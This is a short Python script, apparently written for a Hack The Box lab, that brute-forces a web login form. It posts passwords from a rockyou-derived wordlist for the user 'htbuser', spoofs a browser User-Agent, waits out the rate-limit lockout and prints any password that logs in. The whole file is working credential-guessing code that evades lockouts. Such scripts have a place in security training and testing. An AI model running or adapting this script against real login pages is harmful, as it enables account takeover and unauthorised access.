import requests
import time

# file that contain user:pass
userpass_file = "rockyou-filt2-reversed.txt"

# create url using user and password as argument
url = "http://94.237.48.48:52500"

# rate limit blocks for 30 seconds
lock_time = 40

# message that alert us we hit rate limit
lock_message = "Too many login failures"

success = "Welcome"

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:
        # skip comment
        if fline.startswith("#"):
            continue

        # take username
        # username = fline.split(":")[0]
        username = 'htbuser'

        # take password, join to keep password that contain a :
        # password = ":".join(fline.split(":")[1:])
        password = fline

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit": "submit"
        }

        headers = {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        }

        # do the request
        res = requests.post(url, data=data, headers=headers)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            # print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
            print(f"[-] Invalid credentials: passwd:{password}")

        # hit rate limit, let's say we have to wait 30 seconds
        elif lock_message in res.text:
            print(f"[-] Hit rate limit, sleeping {lock_time}")
            # do the actual sleep plus 0.5 to be sure
            time.sleep(lock_time+0.5)

        elif success in res.text:
            print(f"[+] Found credentials with passwd:{password}")

        else:
            print(f"{res.text}")
